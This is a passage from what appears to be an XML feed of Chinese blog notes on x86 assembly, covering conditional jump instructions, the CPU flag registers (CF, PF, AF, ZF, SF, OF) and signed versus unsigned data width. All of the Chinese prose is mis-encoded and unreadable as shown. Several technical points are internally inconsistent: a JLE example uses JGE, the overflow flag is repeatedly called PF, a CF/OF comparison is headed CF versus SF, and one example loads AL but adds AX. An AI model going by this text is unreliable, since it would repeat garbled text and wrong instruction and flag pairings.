class="hljs-number">0X00401063</span></code></pre></div><p>è§£æï¼šç»ˆäºåˆ°äº†è®©æˆ‘ååˆ†è¿·æƒ‘çš„æœ‰æ— ç¬¦å·JCCçš„è·³è½¬æŒ‡ä»¤ï¼Œè¿™é‡Œåšäº†å¯¹æ¯”JB JL,çœ‹æ ‡å¿—ä½è‚¯å®šèƒ½è§£å†³ä¸€åˆ‡ï¼ˆè¿™æ˜¯å¯¹è®¡ç®—æœºæ¥è¯´ï¼‰ï¼Œæˆ‘ä»¬æ²¡çœ‹æ ‡å¿—ä½æå‰åšåˆ¤æ–­çš„è¯€çªï¼š<strong>å°±æ˜¯å½“ä½ ç”¨æœ‰ç¬¦å·æ•°JCCæŒ‡ä»¤ï¼ˆJG,JL,JLE,JGEï¼ŒJNGï¼ŒJNL,JNGEï¼ŒJNLEï¼‰çš„æ—¶å€™ï¼Œä¸€å®šè¦æŠŠä¸¤ä¸ªæ“ä½œæ•°ç›´æ¥äººå·¥çœ‹åšæœ‰ç¬¦å·æ¥çœ‹ï¼</strong></p><p><strong>æ¯”å¦‚è¿™ä¸ªç»ƒä¹ ç”¨åˆ°äº†JL,FFå°±æ˜¯-1äº†ï¼Œé‚£ä¹ˆ<code>-1&lt;1</code>è¿™ä¸ªè‚¯å®šçš„ï¼Œæ‰€ä»¥JLè·³è½¬ã€‚ä½†æ˜¯å¯¹äºJBï¼ŒFFå°±æ˜¯FFè‚¯å®šå¤§äº1ï¼Œæ‰€ä»¥æ²¡æœ‰è·³è½¬ã€‚</strong></p><h4 id="14ã€-JNL-JGE-å¤§äºç­‰äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-SF-OF"><a href="#14ã€-JNL-JGE-å¤§äºç­‰äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-SF-OF" class="headerlink" title="14ã€ JNL, JGE å¤§äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SF=OF"></a>14ã€ JNL, JGE å¤§äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SF=OF</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,0CC<span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JGE</span> <span class="hljs-number">0X0040108B</span></code></pre></div><h4 id="15ã€-JLE-JNG-å°äºç­‰äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-ZF-1-or-SFâ‰ -OF"><a href="#15ã€-JLE-JNG-å°äºç­‰äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-ZF-1-or-SFâ‰ -OF" class="headerlink" title="15ã€ JLE, JNG å°äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) ZF=1 or SFâ‰  OF"></a>15ã€ JLE, JNG å°äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) ZF=1 or SFâ‰  OF</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,0CC<span class="hljs-keyword">CMP</span> <span class="hljs-built_in">CL</span>,<span class="hljs-built_in">AL</span><span class="hljs-keyword">JGE</span> <span class="hljs-number">0X0040108B</span></code></pre></div><p>è¿™ä¸ªå°±æ˜¯å¯¹ç«‹15ç»ƒä¹ ï¼Œæƒ³åˆ©ç”¨ZFç­‰äº1è¿™ä¸ªè·³è½¬ï¼Œåœ¨cmpä¸­æ²¡ä»€ä¹ˆå¥½æ•´çš„ï¼Œ<strong>è¿™ä¸¤ä¸ªæ“ä½œæ•°åªèƒ½æ˜¯ç›¸åŒçš„æ•°ï¼Œæ²¡ä»€ä¹ˆçœ‹ä¸çœ‹åšæœ‰æ— ç¬¦å·çš„è¯´æ³•</strong>ã€‚</p><h4 id="16ã€-JNLE-JG-å¤§äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-ZF-0-and-SF-OF"><a href="#16ã€-JNLE-JG-å¤§äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-ZF-0-and-SF-OF" class="headerlink" title="16ã€ JNLE, JG å¤§äºåˆ™è·³è½¬(æœ‰ç¬¦å·æ•°) ZF=0 and SF=OF"></a>16ã€ JNLE, JG å¤§äºåˆ™è·³è½¬(æœ‰ç¬¦å·æ•°) ZF=0 and SF=OF</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,FF<span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AX</span>,<span class="hljs-built_in">CX</span><span class="hljs-keyword">JG</span>  <span class="hljs-number">0x004010A6</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,0FF<span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JG</span>  <span class="hljs-number">0x004010A6</span></code></pre></div><p>è§£æï¼š</p><p>åˆ¤æ–­ä¸€ä¸‹ï¼Œç¬¬1æ®µä»£ç å¯¹è¿˜æ˜¯ç¬¬2æ®µä»£ç å¯¹ï¼Ÿ</p><p>åœ¨åŸæ¥çš„è§‚ç‚¹ï¼Œå¯¹æœ‰ç¬¦å·JCCè¦æŠŠä¸¤ä¸ªæ“ä½œæ•°çœ‹åšè½¬åŒ–åçš„æœ‰ç¬¦å·æ•°å¯¹å¾…ï¼Œ<strong>ä¸”ä¸€å®šè¦æ³¨æ„ä¸‹æ•°æ®å®½åº¦ã€‚</strong>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç¬¬ä¸€æ®µä»£ç æ˜¯æ— æ³•å®ç°JGè·³è½¬çš„ï¼Œ<strong>å› ä¸ºå…¶æ•°æ®å®½åº¦çš„é—®é¢˜ï¼Œå½±å“åˆ°SF,æ‰€ä»¥å…¶æ²¡åŠæ³•<code>SF=OF</code>å°±æ²¡æ³•è·³è½¬ã€‚</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ‡å¿—å¯„å­˜å™¨</title>
    <link href="/2019/10/06/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <url>/2019/10/06/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ‡å¿—å¯„å­˜å™¨"><a href="#æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="æ ‡å¿—å¯„å­˜å™¨"></a>æ ‡å¿—å¯„å­˜å™¨</h1><h2 id="éƒ¨åˆ†æ ‡å¿—å¯„å­˜å™¨è¯¦ç»†ä»‹ç»"><a href="#éƒ¨åˆ†æ ‡å¿—å¯„å­˜å™¨è¯¦ç»†ä»‹ç»" class="headerlink" title="éƒ¨åˆ†æ ‡å¿—å¯„å­˜å™¨è¯¦ç»†ä»‹ç»"></a>éƒ¨åˆ†æ ‡å¿—å¯„å­˜å™¨è¯¦ç»†ä»‹ç»</h2><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15704423980063.jpg" srcset="/img/loading.gif" alt><br>éœ€è¦å…ˆç†Ÿç»ƒè®°ä½è¿™å‡ ä¸ªå¯„å­˜å™¨çš„ä½ç½®å’Œåç§°ï¼š<code>CF PF AF ZF SF OF</code></p><h3 id="CF"><a href="#CF" class="headerlink" title="CF"></a>CF</h3><p>è¿›ä½æ ‡å¿—CF(Carry Flag):å¦‚æœè¿ç®—ç»“æœçš„<strong>æœ€é«˜ä½</strong>äº§ç”Ÿäº†ä¸€ä¸ªè¿›ä½æˆ–å€Ÿä½ï¼Œé‚£ä¹ˆï¼Œå…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</p><p>è§£æï¼šåœ¨çœ‹è¿ç®—ç»“æœçš„æ—¶å€™ï¼Œå…ˆæå‰ç¡®å®šå¥½å‚ä¸è¿ç®—çš„æ•°æ˜¯<strong>æœ‰æ— ç¬¦å·æ•°</strong>å’Œ<strong>å®ƒä»¬çš„æ•°æ®å®½åº¦</strong>ã€‚å…¶ä¸PFçš„éš¾è¾¨éš¾åˆ†ï¼Œé‡ç‚¹æ˜¯çœ‹å‚ä¸è¿ç®—çš„æ•°æ˜¯å¦ä¸ºæ— ç¬¦å·æ•°ï¼Œè¿™ä¸ªæ˜¯ç¨‹åºå‘˜å†™ä»£ç çš„æ—¶å€™å®šä¹‰çš„ã€‚é»˜è®¤éƒ½æ˜¯æœ‰ç¬¦å·çš„ï¼Œè¿™å°±ä¸»è¦çœ‹åé¢çš„PFäº†ã€‚</p><h3 id="PF"><a href="#PF" class="headerlink" title="PF"></a>PF</h3><p>å¥‡å¶æ ‡å¿—PF(Parity Flag)ï¼šPFæ ‡å¿—ä½ï¼Œæ ¹æ®ç»“æœä¸­<strong>æœ€ä½æœ‰æ•ˆå­—èŠ‚(æœ€ä½8ä½)</strong>ä¸­â€œ1â€çš„ä¸ªæ•°æ¥ç¡®å®šç½®1è¿˜æ˜¯æ¸…0ã€‚å¦‚æœâ€œ1â€çš„ä¸ªæ•°ä¸ºå¶æ•°ï¼Œåˆ™PFçš„å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</p><p>è§£æï¼šè¿™ä¸ªåœ¨å¾ˆå¤šæ•™æä¸­æ˜¯é”™çš„ï¼Œè¿™ä¸ªéœ€è¦å¼ºè°ƒæ ¹æ®çš„æ˜¯è¿ç®—ç»“æœçš„æœ€ä½æœ‰æ•ˆå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æœ€ä½8ä½é‡Œé¢1çš„ä¸ªæ•°ã€‚</p><h3 id="AF"><a href="#AF" class="headerlink" title="AF"></a>AF</h3><p>è¾…åŠ©è¿›ä½æ ‡å¿—AF(Auxiliary Carry Flag)ï¼š<br>å¦‚æœåœ¨â€œåŠ â€æ“ä½œæœŸé—´ä»ä½åŠå­—èŠ‚ï¼ˆæœ€ä½å››ä½ï¼‰åˆ°é«˜åŠå­—èŠ‚ï¼ˆé«˜å››ä½ï¼‰æœ‰è¿›ä½ï¼Œæˆ–è€…åœ¨å‡æ³•æœŸé—´çš„ä½8ä½éƒ¨åˆ†ä»é«˜åŠå­—èŠ‚åˆ°ä½åŠå­—èŠ‚æœ‰å€Ÿä½ï¼Œåˆ™å°†è¾…åŠ©æ ‡å¿—è®¾ç½®ä¸ºï¼ˆ1ï¼‰ã€‚å¦åˆ™ï¼Œå¦‚æœä¸å‘ç”Ÿè¿™ç§è¿›ä½æˆ–å€Ÿä½ï¼Œåˆ™æ¸…é™¤æ ‡å¿—æˆ–å°†å…¶â€œå¤ä½â€ï¼ˆè®¾ç½®ä¸º0ï¼‰ã€‚<strong>â€”-ï¼ˆç»´åŸºç™¾ç§‘ï¼‰</strong></p><p>è¾…åŠ©è¿¸ä½æ ‡å¿—:ç®—æ•°æ“ä½œçµæœçš„ç¬¬ä¸‰ä½ã€ˆä»0å¹µå§‹è®¡æ•°ã€‰å¦‚æœå‘ç”Ÿäº†è¿¸ä½æˆ–è€…å€Ÿä½å‰‡å°‡å…¶ç½®ä¸º1,å¦å‰‡ä¸º0,å¸¸åœ¨BCD(binary-codedecimal)ç®—æœ¨è¿„ç®—ä¸­è¢«ä½¿ç”¨ã€‚<strong>â€”ï¼ˆç™¾åº¦ç™¾ç§‘ï¼‰</strong></p><p>è§£æï¼šè¿™ä¸ªè¿˜æ˜¯åœ¨å¾ˆå¤šèµ„æ–™ä¸Šæ˜¯é”™è¯¯çš„ï¼Œåœ¨x86æ±‡ç¼–ä¸Šæ­£ç¡®è§£é‡Šå¦‚ä¸Šï¼Œä¹Ÿå°±æ˜¯<strong>åœ¨D0-D7ä¸­ï¼ŒD3å‘D4ä½è¿›ä½æˆ–è€…å€Ÿä½ï¼Œæ‰ä¼šç½®1ã€‚</strong>ï¼ˆè¿™ä¸ªå½“åˆè€å¸ˆè®²é”™ã€ç™¾åº¦é«˜èµä¹Ÿæ˜¯é”™çš„ï¼Œè¦æ³¨æ„ä¸€ä¸‹ï¼‰ã€‚</p><h3 id="ZF"><a href="#ZF" class="headerlink" title="ZF"></a>ZF</h3><p>é›¶æ ‡å¿—ZF(Zero Flag)ï¼šé›¶æ ‡å¿—ZFç”¨æ¥åæ˜ è¿ç®—ç»“æœæ˜¯å¦ä¸º0ã€‚å¦‚æœè¿ç®—ç»“æœä¸º0ï¼Œåˆ™å…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚åœ¨åˆ¤æ–­è¿ç®—ç»“æœæ˜¯å¦ä¸º0æ—¶ï¼Œå¯ä½¿ç”¨æ­¤æ ‡å¿—ä½ã€‚<br>è§£æï¼šå¼•ä¸€ä¸‹å¸¸ç”¨çš„<code>xor r8/16/32,r8/16/32</code>å¯¹å¯„å­˜å™¨æ¸…é›¶æ“ä½œã€‚</p><h3 id="SF"><a href="#SF" class="headerlink" title="SF"></a>SF</h3><p>ç¬¦å·æ ‡å¿—SF(Sign Flag)ï¼šç¬¦å·æ ‡å¿—SFç”¨æ¥åæ˜ è¿ç®—ç»“æœçš„ç¬¦å·ä½ï¼Œå®ƒä¸è¿ç®—ç»“æœçš„æœ€é«˜ä½ç›¸åŒã€‚</p><p>è§£æï¼šè¿˜æ˜¯éœ€è¦ç¡®å®šæ•°æ®å®½åº¦ï¼Œçœ‹å¥½åˆ°åº•å“ªä¸ªæ˜¯æœ€é«˜ä½ï¼Œç„¶åæŠŠ<strong>å®ƒæ¢æˆ2è¿›åˆ¶</strong>ç¡®å®šæœ€é«˜ä½æ˜¯0è¿˜æ˜¯1.<br>ä¾‹å­ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">20</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,<span class="hljs-number">8000</span><span class="hljs-keyword">ADD</span> <span class="hljs-built_in">AX</span>,<span class="hljs-built_in">CX</span></code></pre></div><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15704627287517.jpg" srcset="/img/loading.gif" alt="-w117"><br>è¿™ä¸ªå°±æ˜¯åœ¨å­—ä¸Šæ“ä½œï¼Œç„¶åç›¸åŠ ç»“æœæ˜¯<code>8020</code>,æœ€é«˜ä½å°±æ˜¯<code>1000</code>ï¼Œé‚£è¿™ä¸ªSFå°±æ˜¯1äº†ã€‚è¦æ³¨æ„ä¸€ä¸‹è¿™ä¸ªsfæ ‡å¿—ä¹Ÿæ˜¯çœ‹æ•°æ®å®½åº¦çš„ã€‚</p><h3 id="OF"><a href="#OF" class="headerlink" title="OF"></a>OF</h3><p>æº¢å‡ºæ ‡å¿—OF(Overflow Flag)ï¼šæº¢å‡ºæ ‡å¿—OFç”¨äºåæ˜ æœ‰ç¬¦å·æ•°åŠ å‡è¿ç®—æ‰€å¾—ç»“æœæ˜¯å¦æº¢å‡ºã€‚å¦‚æœè¿ç®—ç»“æœè¶…è¿‡å½“å‰è¿ç®—ä½æ•°æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œåˆ™ç§°ä¸ºæº¢å‡ºï¼ŒOFçš„å€¼è¢«ç½®ä¸º1ï¼Œå¦åˆ™ï¼ŒOFçš„å€¼è¢«æ¸…ä¸º0ã€‚</p><p>è§£æï¼šè¿™ä¸ªå¸¸ä¸CFæ··æ·†ï¼Œä»¥ä¸ºä»–ä»¬æ²¡å•¥åŒºåˆ«ï¼Œä½†æ˜¯è¿™ä¸ªæ‰æ˜¯æ­£å®—çš„è®¡ç®—æœºçœ‹æ˜¯å¦æº¢å‡ºçš„æ ‡å¿—ä½ã€‚</p><p>CFä¸SFåŒºåˆ«ï¼š</p><ul><li>è¿›ä½æ ‡å¿—è¡¨ç¤º<strong>æ— ç¬¦å·æ•°</strong>è¿ç®—ç»“æœæ˜¯å¦è¶…å‡ºèŒƒå›´.</li><li>æº¢å‡ºæ ‡å¿—è¡¨ç¤º<strong>æœ‰ç¬¦å·æ•°</strong>è¿ç®—ç»“æœæ˜¯å¦è¶…å‡ºèŒƒå›´.</li></ul><p>æº¢å‡ºä¸»è¦æ˜¯ç»™<strong>æœ‰ç¬¦å·è¿ç®—</strong>ä½¿ç”¨çš„ï¼Œåœ¨æœ‰ç¬¦å·çš„è¿ç®—ä¸­ï¼Œæœ‰å¦‚ä¸‹çš„è§„å¾‹ï¼š</p><ul><li>æ­£ + æ­£ = æ­£ å¦‚æœç»“æœæ˜¯è´Ÿæ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º</li><li>è´Ÿ + è´Ÿ = è´Ÿ å¦‚æœç»“æœæ˜¯æ­£æ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º</li><li>æ­£ + è´Ÿ æ°¸è¿œéƒ½ä¸ä¼šæœ‰æº¢å‡º.<br><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15704444932243.jpg" srcset="/img/loading.gif" alt="-w315"><br>ç»“åˆè¿™ä¸ªå›¾åœ¨åº”ä¸ºå¯¹PFçš„åˆ¤æ–­ï¼Œéå¸¸å¥½ç”¨ã€‚<strong>åˆ¤æ–­çš„æ—¶å€™ï¼Œä¸€å®šæ³¨æ„PFæ˜¯åœ¨æœ‰ç¬¦å·æ•°åšè¿ç®—çš„æ—¶å€™å»çœ‹çš„ï¼Œæ— ç¬¦å·ç›´æ¥çœ‹CFå°±å¥½äº†ã€‚</strong></li></ul><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“CFä½çš„å€¼"><a href="#å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“CFä½çš„å€¼" class="headerlink" title="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“CFä½çš„å€¼"></a>å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“CFä½çš„å€¼</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,0FE<span class="hljs-keyword">ADD</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">10</span></code></pre></div><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15703705840520.jpg" srcset="/img/loading.gif" alt="-w669"></p><h3 id="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“PFä½çš„å€¼"><a href="#å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“PFä½çš„å€¼" class="headerlink" title="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“PFä½çš„å€¼"></a>å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“PFä½çš„å€¼</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">ADD</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">2</span></code></pre></div><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15703707829255.jpg" srcset="/img/loading.gif" alt="-w630"></p><h3 id="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“AFä½çš„å€¼"><a href="#å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“AFä½çš„å€¼" class="headerlink" title="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“AFä½çš„å€¼"></a>å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“AFä½çš„å€¼</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,0F<span class="hljs-keyword">ADD</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-number">1</span></code></pre></div><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15703770643896.jpg" srcset="/img/loading.gif" alt="-w588"></p><h3 id="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“SFä½çš„å€¼"><a href="#å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“SFä½çš„å€¼" class="headerlink" title="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“SFä½çš„å€¼"></a>å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“SFä½çš„å€¼</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,0F1<span class="hljs-keyword">ADD</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">1</span></code></pre></div><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15703773573324.jpg" srcset="/img/loading.gif" alt="-w716"></p><h3 id="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“OFä½çš„å€¼"><a href="#å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“OFä½çš„å€¼" class="headerlink" title="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“OFä½çš„å€¼"></a>å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“OFä½çš„å€¼</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">80</span><span class="hljs-keyword">SUB</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">10</span></code></pre></div><p>è¿™ä¸ªéœ€è¦é‡è§†ä¸‹ï¼Œç»ƒä¹ çš„æ—¶å€™æœ‰ç‚¹å—æ€ç»´é™åˆ¶äº†ã€‚æ²¡æœ‰æƒ³åˆ°ç”¨SUBæ¥æ„é€ å‡ºï¼Œ<strong>ç«™åœ¨80çš„ä½ç½®é¡ºæ—¶é’ˆæŸ¥10ï¼Œè´Ÿ-æ­£=æ­£</strong>ï¼Œæ¥å®ç°æº¢å‡ºå®Œæˆåªå½±å“OFä½ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—</title>
    <link href="/2019/10/01/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/"/>
    <url>/2019/10/01/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/</url>
    
    <content type="html"><![CDATA[<h1 id="æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—"><a href="#æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—" class="headerlink" title="æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—"></a>æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—</h1><h2 id="æ•°æ®å®½åº¦"><a href="#æ•°æ®å®½åº¦" class="headerlink" title="æ•°æ®å®½åº¦"></a>æ•°æ®å®½åº¦</h2><p>æ•°å­¦ä¸Šçš„æ•°å­—ï¼Œæ˜¯æ²¡æœ‰å¤§å°é™åˆ¶çš„ï¼Œå¯ä»¥æ— é™çš„å¤§ã€‚ä½†åœ¨è®¡ç®—æœºä¸­ï¼Œç”±äºå—ç¡¬ä»¶çš„åˆ¶çº¦ï¼Œæ•°æ®éƒ½æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼ˆæˆ‘ä»¬ç§°ä¸ºæ•°æ®å®½åº¦ï¼‰ï¼Œè¶…è¿‡æœ€å¤šå®½åº¦çš„æ•°æ®ä¼šè¢«ä¸¢å¼ƒã€‚</p><h3 id="å¯¹æ•°æ®å®½åº¦çš„ç†è§£å’Œæœ‰æ— ç¬¦å·æ•°"><a href="#å¯¹æ•°æ®å®½åº¦çš„ç†è§£å’Œæœ‰æ— ç¬¦å·æ•°" class="headerlink" title="å¯¹æ•°æ®å®½åº¦çš„ç†è§£å’Œæœ‰æ— ç¬¦å·æ•°"></a>å¯¹æ•°æ®å®½åº¦çš„ç†è§£å’Œæœ‰æ— ç¬¦å·æ•°</h3><h4 id="4ä½å®½åº¦è¡¨ç¤º"><a href="#4ä½å®½åº¦è¡¨ç¤º" class="headerlink" title="4ä½å®½åº¦è¡¨ç¤º"></a>4ä½å®½åº¦è¡¨ç¤º</h4><p>4ä½å®½åº¦è¡¨ç¤ºï¼šå‡è®¾è®¡ç®—æœºåªèƒ½å­˜å‚¨4ä½2è¿›åˆ¶æ•°ï¼š</p><table><thead><tr><th align="center">0000</th><th align="center">0001</th><th align="center">0010</th><th align="center">0011</th><th align="center">0100</th><th align="center">0101</th><th align="center">0110</th><th align="center">0111</th><th align="center">1000</th><th align="center">1001</th><th align="center">1010</th><th align="center">1011</th><th align="center">1100</th><th align="center">1101</th><th align="center">1110</th><th align="center">1111</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">A</td><td align="center">B</td><td align="center">C</td><td align="center">D</td><td align="center">E</td><td align="center">F</td></tr></tbody></table><p><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15699374653790.jpg" srcset="/img/loading.gif" alt="-w303"><br>å­˜æ— ç¬¦å·æ•°æ—¶ï¼š<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code><br>å­˜æœ‰ç¬¦å·æ•°æ—¶ï¼š<br>    æ­£æ•°ï¼š<code>0 1 2 3 4 5 6 7</code><br>    è´Ÿæ•°ï¼š<code>-1 -2 -3 -4 -5 -6 -7 -8</code><br>    å…¶ä¸­å¯¹åº”å…³ç³»ï¼š</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>F</td><td>E</td><td>D</td><td>C</td><td>B</td><td>A</td><td>9</td><td>8</td></tr></tbody></table><p>æ— ç¬¦å·æ•°æ—¶ï¼šä»0åˆ°Fé€†æ—¶é’ˆä¾æ¬¡å¢å¤§ã€‚</p><p>æœ‰ç¬¦å·æ•°æ—¶ï¼šå«ä¹‰ä»åœ†ä¸­é—´åŠˆå¼€ï¼Œæ­£æ•°è´Ÿæ•°å„ä¸€åŠï¼Œåœ¨Få¤„ä¸ºæœ€å¤§è´Ÿæ•°ï¼Œ0å¤„ä¸ºæœ€å°çš„æ­£æ•°ã€‚</p><h5 id="ä¸ºä»€ä¹ˆåœ¨å­˜æœ‰ç¬¦å·æ•°æ—¶è¯´å¼€å¤´ä¸º1çš„æ•°å°±æ˜¯è´Ÿæ•°ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆåœ¨å­˜æœ‰ç¬¦å·æ•°æ—¶è¯´å¼€å¤´ä¸º1çš„æ•°å°±æ˜¯è´Ÿæ•°ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆåœ¨å­˜æœ‰ç¬¦å·æ•°æ—¶è¯´å¼€å¤´ä¸º1çš„æ•°å°±æ˜¯è´Ÿæ•°ï¼Ÿ"></a>ä¸ºä»€ä¹ˆåœ¨å­˜æœ‰ç¬¦å·æ•°æ—¶è¯´å¼€å¤´ä¸º1çš„æ•°å°±æ˜¯è´Ÿæ•°ï¼Ÿ</h5><p>æˆ‘ä»¬åªçœ‹äºŒè¿›åˆ¶ï¼š<br>| 0  | 1 | 2 | 3 | 4 | 5 | 6 | 7 |<br>| â€” | â€” | â€” | â€” | â€” | â€” | â€” | â€” | â€”  |<br>| 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 |</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>1111</td><td>1110</td><td>1101</td><td>1100</td><td>1011</td><td>1010</td><td>1001</td><td>1000</td></tr><tr><td>å¾ˆæ˜æ˜¾å°±å¯ä»¥çœ‹å‡ºï¼Œå½“äºŒè¿›åˆ¶å¼€å¤´ä¸º1çš„æ—¶å€™å¯¹åº”å­˜çš„æ•°å€¼å°±æ˜¯è´Ÿæ•°äº†ã€‚</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>ä¸¾ä¾‹ï¼šå¯¹1011çš„ç†è§£</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1011åœ¨æˆ‘ä»¬å½“åšæ˜¯æœ‰ç¬¦å·æ—¶å°±æ˜¯-5ï¼Œæ— ç¬¦å·å°±æ˜¯Bã€‚<strong>è¿™ä¸ªå®Œå…¨çœ‹æˆ‘ä»¬å¦‚ä½•å»å®šä¹‰ã€‚</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>#### 